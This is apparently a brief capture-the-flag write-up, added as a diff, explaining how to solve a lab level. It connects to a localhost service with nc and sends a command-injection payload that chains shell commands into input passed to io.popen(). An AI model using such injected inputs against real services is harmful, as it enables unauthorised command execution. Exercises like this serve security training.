@@ -1,0 +1,12 @@
+The server is listening on localhost:5151.
+
+Connect to it with:
+
+nc localhost 5151
+
+Then send:
+
+Im in; getflag > /tmp/flag; chmod 644 /tmp/flag; echo lol
+
+This executes the getflag through the io.popen() function and returns the result
+in a file on which we set the appropriate rights. There you go.
